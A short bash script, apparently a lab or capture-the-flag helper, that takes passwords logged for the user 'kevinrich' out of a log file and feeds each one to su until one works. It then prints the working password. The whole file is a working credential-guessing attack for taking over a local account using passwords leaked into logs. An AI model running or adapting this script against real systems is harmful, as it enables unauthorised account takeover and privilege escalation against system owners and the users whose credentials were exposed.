#!/bin/bash

# Define the username you want to test the passwords for
USERNAME="kevinrich"
LOG_FILE="logs.txt"

# Check if the log file exists
if [ ! -f "$LOG_FILE" ]; then
  echo "Error: Log file $LOG_FILE does not exist."
  exit 1
fi

# Iterate through the log file, extract the password for the specified user, and try logging in
while IFS= read -r line; do
  # Extract the username and password from the log file format
  if [[ "$line" == *"username= $USERNAME"* ]]; then
    # Extract the password from the log line
    PASSWORD=$(echo "$line" | grep -oP '(?<=password=)[^,]+')

    echo "Trying password: $PASSWORD"

    # Use 'su' to attempt to switch to the user and check if it succeeds
    echo "$PASSWORD" | su -c "whoami" "$USERNAME" 2>/dev/null

    # Check if the 'su' command succeeded
    if [ $? -eq 0 ]; then
      echo "Success! The correct password for $USERNAME is: $PASSWORD"
      exit 0
    else
      echo "Failed login attempt for password: $PASSWORD"
    fi
  fi
done < "$LOG_FILE"

echo "No valid password found in $LOG_FILE."
exit 1
